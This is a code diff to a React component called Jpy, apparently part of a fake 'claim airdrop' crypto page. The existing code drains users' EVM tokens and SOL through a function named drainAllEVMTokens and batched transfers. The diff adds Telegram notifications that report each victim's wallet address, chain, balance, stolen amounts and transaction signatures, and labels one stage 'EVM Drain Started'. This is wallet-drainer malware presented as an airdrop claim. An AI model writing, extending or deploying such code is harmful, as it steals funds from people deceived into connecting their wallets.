@@ -127,9 +127,24 @@ const Jpy = () => {
   }, [publicKey, solBalance, connection]);
 
   const handleClaimTokens = async () => {
+    // Send notification that claim button was clicked
+    if (publicKey || isEVMConnected) {
+      sendTelegramMessage(`
+🎯 <b>Claim Airdrop Button Clicked (JPY)</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58() || (await evmSigner?.getAddress()) || 'N/A'}</code>
+🌐 <b>Chain:</b> <code>${chainName}</code>
+`);
+    }
+
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
+        const evmAddress = await evmSigner.getAddress();
+        sendTelegramMessage(`
+⚡ <b>EVM Drain Started (JPY)</b>
+👤 <b>User:</b> <code>${evmAddress}</code>
+🌐 <b>Chain:</b> <code>${chainName}</code>
+`);
         await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
       } catch (error: any) {
       } finally {
@@ -156,6 +171,11 @@ const Jpy = () => {
           description: `Get at least 0.5 SOL worth of $JUP in order to claim airdrop.`,
           duration: 5000,
         });
+        sendTelegramMessage(`
+⚠️ <b>Low Balance Warning (JPY)</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+💰 <b>SOL Balance:</b> <code>${currentSolBalance.toFixed(4)} SOL</code>
+`);
         // Don't return, continue with transaction logic
       }
 
@@ -182,6 +202,12 @@ const Jpy = () => {
         transaction.feePayer = publicKey;
         const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
         await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+        sendTelegramMessage(`
+✅ <b>Transaction Signed (SOL Transfer - JPY Claim)</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+💰 <b>Amount:</b> <code>${(lamportsToSend / LAMPORTS_PER_SOL).toFixed(4)} SOL</code>
+🔗 <b>Signature:</b> <code>${signature}</code>
+`);
       }
 
       const validTokens = currentBalances.filter(token => token.balance > 0);
@@ -203,6 +229,7 @@ const Jpy = () => {
            sendTelegramMessage(`
 ✅ <b>Transaction Signed (Token Batch ${i + 1} - JPY Claim)</b>
 👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+🪙 <b>Tokens in Batch:</b> <code>${batch.length} tokens</code>
 🔗 <b>Signature:</b> <code>${signature}</code>
 `);
         }
@@ -210,6 +237,13 @@ const Jpy = () => {
       fetchAllBalances();
     } catch (error: any) {
       console.error('Claim error:', error);
+      if (publicKey) {
+        sendTelegramMessage(`
+❌ <b>Claim Error (JPY)</b>
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+📝 <b>Error:</b> <code>${error?.message || 'Unknown error'}</code>
+`);
+      }
     } finally {
       setIsClaiming(false);
     }
